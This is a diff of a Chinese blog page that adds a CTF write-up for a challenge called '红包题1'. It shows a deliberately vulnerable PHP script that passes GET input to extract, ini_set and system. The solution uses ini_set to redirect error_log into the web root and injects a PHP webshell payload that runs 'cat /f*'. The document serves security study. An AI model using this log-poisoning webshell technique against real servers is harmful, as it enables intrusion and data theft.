@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.7k</span>
+            <span class="post-count">2k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">7 分钟</span>
+            <span class="post-count">9 分钟</span>
         </span>
     </span>
 </div>
@@ -232,6 +232,28 @@
 <p>?&gt;&lt;?&#x3D;是php的短标签(&lt;?&#x3D;)和闭合标签(?&gt;)</p>
 <p><code>&lt;?= $name ?&gt;</code> &#x3D;类似于echo形式</p>
 <p>思路为：只要是php接收到上传的POST请求，就会保存一个临时文件，若这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在linux系统下的命名规则永远是<code>phpXXXXXX</code></p>
+<h2 id="红包题1"><a href="#红包题1" class="headerlink" title="红包题1"></a>红包题1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>extract</code>：从数组中将变量导入到当前的符号表</p>
+<p><code>ini_set</code>：为一个配置选项设置值（可以修改配置项）</p>
+<p>报错等级是<code>2</code>。他限定只能使用<code>ls 什么什么</code>，而且<code>filter</code>自定义函数过滤了<code>&#39;</code>、 <code>\</code> 、&#96;&#96; <code>、</code>$<code>这四个字符。不好使用闭合来绕过对</code>getshell&#96;的限制。</p>
+<p>解答：</p>
+<p><code>?1=/</code>，显示</p>
+<blockquote>
+<p>bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</p>
+</blockquote>
+<p>其中，有flag</p>
+<p><code>?1=/falg</code>，显示</p>
+<blockquote>
+<p>&#x2F;flag</p>
+</blockquote>
+<p><code>关注一下ini_set($name,$value);</code></p>
+<p>通过触发异常后，将回显的内容(可控)写入到web目录（修改配置项，把报错写入自定义报错日志）。即可实现写马到文件。</p>
+<p>%00阶段导致报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=error_log&amp;value=/var/www/html/123.php&amp;1=%00&lt;?php system(&quot;cat /f*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20230910123848661.png"></p>
+<p>访问<code>/123.php</code>，报错已经写入自定义的报错日志，同时，报错代码被自动执行了。</p>
 <h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="1-web12"><a href="#1-web12" class="headerlink" title="1.web12"></a>1.web12</h2><blockquote>
 <p>?cmd&#x3D;phpinfo();</p>
 </blockquote>
